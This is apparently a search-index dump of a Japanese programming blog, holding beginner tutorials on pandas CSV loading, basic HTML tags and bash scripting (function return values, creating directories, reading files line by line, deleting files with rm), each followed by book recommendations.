2002000404,2520 2002000505,2573 2002000606,2520 2002000707,2431 2002000808,2404 こんな感じで年月と値段の２列のcsvになりました。\npythonのソースコードは以下の通り\nimport matplotlib.pyplot as plt import pandas as pd from hampel import hampel df = pd.read_csv(\u0026#39;./kome.csv\u0026#39;) print(df) 2002000101 2483 0 2002000202 2483 1 2002000303 2480 2 2002000404 2520 3 2002000505 2573 4 2002000606 2520 .. ... ... 233 2021000707 2470 234 2021000808 2443 デリミタが「,」の時はdelimiter=\u0026quot;;\u0026ldquo;みたく第２引数で指定する必要はないみたいです。\ncsvの読み込み方はいろんなサイトに書かれているのですが、読み込んだcsvを操作する方法についてはすぐ出てこなかったので次回はpandasで読み込んだcsvを操作する方法を取り扱いと思います。\n","date":"2022-01-14T13:40:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-01-ani/","title":"s-Stat 時系列データで異常値を検知しよう（１）"},{"content":"はじめに HTMLをこれから始める人、HTMLってプログラムみたいで難しそうと思っている人、HTMLで挫折してしまった人。そういった人たちでもHTMLがわかるようになってほしいと思って「現役Webデザイナーが教えるHTML初心者講座」を始めてみました。\nまずは簡単にタグを覚える方法を紹介します。\nHTMLってなに？ HTMLとは（Hypertext Markup Language、ハイパーテキスト・マークアップ・ランゲージ）と呼ばれる言語のことで、書き方でタイトルや文章、箇条書き、画像の挿入ができたりします。\nたとえば\n\u0026lt;h1\u0026gt;タイトル\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;文章\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;リンク\u0026lt;/a\u0026gt; という内容であればヘッドラインと文章とリンクになります。\n他のプログラムのようにHTML自体で何かを動かすということはできませんが、Web上でなにか公開すると、HTMLを使う必要が出てきます。\nタグを覚えよう HTMLにはタグと呼ばれるものがあり、それぞれ意味を持っています。\n「たくさんあって覚えられないよ」という人もいるかと思います。HTMLは覚えたらそれがすべてというわけではなく、年々更新されて、知らないようなタグが出てきたりします。\nとはいっても、基本的なタグは変わりません。\nここでは基本的なタグを覚えてみましょう。\n覚え方はすごく簡単です。英語にしたときの頭文字だと思っておけば9割は覚えられました。\n残りの1割程度は頭文字ではなく、単語の確率が高いです。\nこれでHTMLのタグはほぼほぼ覚えられました。\n他の言語と違って、すごく簡単だと思いませんか？\nそれでは主要なタグを見てみましょう。\nヘッドライン \u0026lt;h1\u0026gt; \u0026lt;h2\u0026gt; \u0026lt;h3\u0026gt; \u0026lt;h4\u0026gt; \u0026lt;h5\u0026gt; \u0026lt;h6\u0026gt; Headline（見出し）の頭文字hを使ったタグです。\n文章を書く上で大事なのがhタグです。h1からh6まであります。\nh1は最上位の見出しタグで、基本的にはサイト内に1つしか存在してはならないとされてます。\nそのページのいちばん大事なタイトル部分にh1を設定する事が多いです。\nh2は大見出し的な扱いです。h1よりも重要度は下がってきます。\nh3は小見出し的な扱いです。\nそして、h4、 h5、h6となっていきます。\n文章 \u0026lt;p\u0026gt; Paragraph（文章）の頭文字で、文章を表すタグが\u0026lt;p\u0026gt;です。\n\u0026lt;p\u0026gt;今日はいい天気だ。\u0026lt;/p\u0026gt; とすることで、1つの文章になります。\n段落を構成したい場合は、\n\u0026lt;p\u0026gt;今日はいい天気だ。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;洗濯物もよく乾く。\u0026lt;/p\u0026gt; と\u0026lt;p\u0026gt;を続けて書いてやれば大丈夫です。\n改行 \u0026lt;br\u0026gt; さきほどの文章内で改行したいとなったときはBreak（壊す）の\u0026lt;br\u0026gt;を使ってみましょう。\n「いい天気だ」の「いい」という部分で改行したい場合は\n\u0026lt;p\u0026gt;今日は\u0026lt;br\u0026gt;いい天気だ。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;洗濯物もよく乾く。\u0026lt;/p\u0026gt; とすることで改行がされます。\nリンク \u0026lt;a\u0026gt; 次に、リンクを張りたい場合は、Anchor（いかり）のリンクの出発点や到達点を指定するタグ\u0026lt;a\u0026gt;を使いましょう。\n\u0026lt;a\u0026gt;タグは今までのタグと少し違い、属性と呼ばれる文字を追記する必要があります。\nたとえば、googleにリンクを張りたいと思ったときは\n\u0026lt;a\u0026gt;リンクだよ\u0026lt;/a\u0026gt; とするのではなく、\n\u0026lt;a href=\u0026#34;https://google.com/\u0026#34;\u0026gt;リンクだよ\u0026lt;/a\u0026gt; とする必要があります。\nこのhrefは「hypertext reference」の略です。日本語訳すると「参照」とかになるのでしょうか。\nhref部分にはリンクしたいサイトのURLを貼り付けて、囲んだタグの中には表示したい文字列を入力します。\n画像 \u0026lt;img\u0026gt; Image（画像）はHTMLでも\u0026lt;img\u0026gt;となってます。\nこのタグも前回のリンクと同じように属性が必要です。\n画像に必要な属性はsrcとaltになります。\nsrcは「source（元）」の略で、画像のURLを入力します。\naltは「alternate」の略です。日本語では「代替」となります。画像が何らかの原因で表示できなかったり、目の不自由な方に対して、その画像がどういったものなのかを記述することで、画像を表現できます。\n箱的なもの \u0026lt;div\u0026gt; divはちょっと厄介で、今まで出てきたタグのように意味を持っていません。\nしかし、このタグで囲ったものをグループとして機能させるようにできます。\ndivideやdivisionの略で、分割するという意味になります。\nたとえば、サイトを3つの構成に分けたいとしましょう。\nその場合は、\n\u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;コンテンツ1\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;コンテンツ2\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;コンテンツ3\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; などとすることが可能です。\nリスト \u0026lt;ul\u0026gt; \u0026lt;ol\u0026gt; リスト形式の文章を作りたいときには\u0026lt;ul\u0026gt;や\u0026lt;ol\u0026gt;を使用します。\nulは「unordered list」の略で、順序がないリストと言う意味です。\nolは「order list」の略で、順序があるリストと言う意味ですね。\nulやolの中には\u0026lt;li\u0026gt;というタグを記述します。\nこれは「list」を意味するタグです。\n\u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;リスト1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト3\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;リスト1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト3\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; ulとolの違いは、ulの場合はliの頭に「・」が付き、olの場合は「数字」が付きます。\n以上が比較的よく使うHTMLタグになります。\nまとめ すごく簡単でしたが、HTMLのタグの説明になります。\nタグが多くて難しいと感じている方は、やりたいことを英語にしたときになんていうのかということを考えれば、HTMLタグに置き換えることができるのではないかと思います。\nたとえば、文章を強調したいなと思ったとしたら、強調は強くしたいってことだから「strong」だよな。となります。\nそして、HTMLには\u0026lt;strong\u0026gt;という強調のためのタグが存在しています。\nまた、ここは関係ないところだなというのは、脇に追いやっておきたいので、\u0026lt;aside\u0026gt;というタグを使うことが可能です。\nこのように、HTMLタグは自分がやりたいとを英語にしたときになんて言うのかさえわかってしまえば簡単に記述することが可能です。\nオススメの書籍 【Amazon.co.jp 限定】1冊ですべて身につくHTML \u0026amp; CSSとWebデザイン入門講座 (DL特典: CSS Flexbox チートシート) Web界隈やデザイナーに大人気! Web関連の情報やデザインについて記事が学べる『Webクリエイターボックス』の管理人、 Manaによる渾身のHTML \u0026amp; CSSとWebデザインが学べる本\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 これだけで基本がしっかり身につく HTML/CSS\u0026amp;Webデザイン1冊目の本 Webサイト制作をこれから学ぶ人へ送る “1冊目\u0026#34;に最適の入門書! 【学びをサポートする4大特典つき】 本書は手を動かしてWebサイトを作りながら\nHTML/CSSとWebデザインの基本を楽しく学べる入門書です。\n初学者が1冊目に読む本としてふさわしい内容を盛り込んでいるため、\nこれを読めば必要な基礎知識がひととおり身につきます。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n","date":"2022-01-13T14:14:30+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-13-01-wyoshi/image_hub0ad8d9b7843596d0a4360bbec01c5d1_56986_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-13-01-wyoshi/","title":"現役Webデザイナーが解説する初めてのHTML初心者講座"},{"content":"関数からの戻り値の受け渡し 関数からの戻り値の受け渡し：\nBash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。\u0026lsquo;function_return.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。\n#!/bin/bash function greeting(){ str=\u0026#34;こんにちは、$name\u0026#34;; echo \u0026#34;$str\u0026#34;; } echo \u0026#34;あなたの名前を入力して下さい\u0026#34;; read name; val=$(greeting); echo \u0026#34;関数からの戻り値は「${val}」です。\u0026#34;; bashコマンドでファイルを実行します。\n$ bash function_return.sh あなたの名前を入力して下さい suzuki 関数からの戻り値は「こんにちは、suzuki」です。 $ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/","title":"【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」"},{"content":"ディレクトリを作成する ディレクトリを作成する：\nBashは「mkdir」コマンドを使用して新しいディレクトリを作成します。\u0026lsquo;make_directory.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加して、ユーザーから新しいディレクトリ名を取得します。ディレクトリ名が現在の場所に存在しない場合は、ディレクトリが作成されます。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34; read newdir `mkdir \u0026#34;$newdir\u0026#34;` bashコマンドでファイルを実行します。\n$ bash make_directory.sh ディレクトリ名を入力して下さい。 suzuki $ ls suzuki/ ヒント よく記述していたのは以下のようなコードでした。 事前にディレクトリの存在チェックを行い、見つからなかった場合のみディレクトリを作成します。 #!/bin/bash if [ -d \u0026#34;/tmp/of/work\u0026#34; ];then : # 何もしない else mkdir -p \u0026#34;/tmp/work\u0026#34;; fi cd \u0026#34;/tmp/of/work\u0026#34;; ヒント 実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。 mkdir -p コマンドは以下のような挙動をします。 作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する\n作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない #!/bin/bash # 一旦ディレクトリを作成 mkdir -p /tmp/work ls -l -d /tmp/work/ # 出力 # drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/ # オプション無しですでに存在しているディレクトリを作成 mkdir /tmp/work # 出力 # mkdir: /tmp/work: File exists echo $? # 1 # -pオプション有りだとエラーを吐かない mkdir -p /tmp/work echo $? # 0 $ bash bash drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/ mkdir: /tmp/work: File exists 1 0 bash-5.1$ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-21-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-21-suzuki/","title":"【２１．ディレクトリを作成する】ざっくりわかる「シェルスクリプト」"},{"content":"存在を確認してディレクトリを作成する 存在を確認してディレクトリを作成します。\n\u0026lsquo;mkdir\u0026rsquo;コマンドを実行する前に、現在の場所にディレクトリが存在することを確認する事ができます。mkdir コマンドの\u0026rsquo; -d \u0026lsquo;オプションは、特定のディレクトリが存在するかどうかをテストするためのオプションです。\u0026lsquo;directory_exist.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。ディレクトリの存在を確認してディレクトリを作成します。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34;; read ndir; if [ -d \u0026#34;$ndir\u0026#34; ];then echo \u0026#34;ディレクトリが存在します。\u0026#34;; else `mkdir $ndir`; echo \u0026#34;ディレクトリを作成しました。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリを作成しました。 $ ls suzuki/ $ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリが存在します。 $ ヒント 実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。 mkdir -p コマンドは以下のような挙動をします。 作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する\n作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない #!/bin/bash # 一旦ディレクトリを作成 mkdir -p /tmp/work ls -l -d /tmp/work/ # 出力 # drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/ # オプション無しですでに存在しているディレクトリを作成 mkdir /tmp/work # 出力 # mkdir: /tmp/work: File exists echo $? # 1 # -pオプション有りだとエラーを吐かない mkdir -p /tmp/work echo $? # 0 $ bash mkdir_example2.sh drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/ mkdir: /tmp/work: File exists 1 0 $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-22-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-22-suzuki/","title":"【２２．存在を確認してディレクトリを作成する】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルを読む ファイルを読む：\nwhileループでreadコマンドを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。\u0026lsquo;read_file.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。 別途作成する\u0026rsquo;book.txt\u0026rsquo;の内容を読み取ります。\n「book.txt」ファイルを作成します。\n$ vim book.txt ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 #!/bin/bash file=\u0026#39;book.txt\u0026#39;; if [ -f \u0026#34;$file\u0026#34; ];then while read line;do echo \u0026#34;$line\u0026#34;; done\u0026lt;$file else echo \u0026#34;$file ファイルがありません\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash read_file.sh ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 具体的に以下のファイルを作成してファイルを読み込み、必要な部分を抜き出して表示してみます。\ni-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k cat します。\n$ cat instance-tag.list i-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k $ 以下のソースファイルを作成します。\n#!/bin/bash # catしてwhile read で1行ずつ読み込む # 「cat instance-tag.list」の結果を1行ずつ「line」 # という変数に代入しています。 cat instance-tag.list | while read line;do # 二つの変数に値切り出して代入 # $()は()内で指定したコマンドの実行結果を返します。 # 今回の場合、「echo $line | cut -d, -f 1」の実行結果が # 「instance_id」に定義されます。 instance_id=$(echo $line | cut -d, -f 1) tag_value=$(echo $line | cut -d, -f 2) # 表示 echo \u0026#34;instance_id: ${instance_id}\u0026#34;; echo \u0026#34;tag_value: ${tag_value}\u0026#34;; done bashコマンドでファイルを実行します。\n$ bash whileread_example2.sh instance_id: i-0f6126b7aeedfabd6 tag_value: hoge instance_id: i-050536efdd9dc1126 tag_value: fuga instance_id: i-0869f24358fb3f698 tag_value: f8k $ ヒント cutコマンドの部分は、awkコマンドを使うこともあります。 今回は、cutの方が処理速度が速いため、cutコマンドを使いました。 ちなみにawkの場合は、以下のように記述します。\ninstance_id=$(echo $line | awk -F, \u0026#39;{print $1;}\u0026#39;); tag_value=$(echo $line | awk -F, \u0026#39;{print $2;}\u0026#39;); 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-23-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-23-suzuki/","title":"【２３．ファイルを読む】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルを削除する ファイルを削除します：\n\u0026lsquo;rm\u0026rsquo;コマンドは、ファイルまたはディレクトリを削除するためのコマンドです。次のコードを使用して「delete_file.sh」という名前のファイルを作成し、ユーザーからファイル名を取得して削除します。ここで、「-i」オプションは、ファイルを削除する前にユーザーに削除確認をに使用されます。\n#!/bin/bash echo \u0026#34;削除するファイルまたはディレクトリ名を入力して下さい。\u0026#34; read fn rm -i $fn bashコマンドでファイルを実行します。\n$ ls suzuki/ book.txt bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 suzuki rm: suzuki: is a directory bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 book.txt $ ls suzuki/ $ ヒント 基本的に、ファイルもディレクトリも削除するコマンドは同じです。ディレクトリには再帰的に（フォルダの階層も含めて）削除するオプション(-r リカーション)があります。 rm\n-f :確認をせずに削除 -r ：再帰的に削除 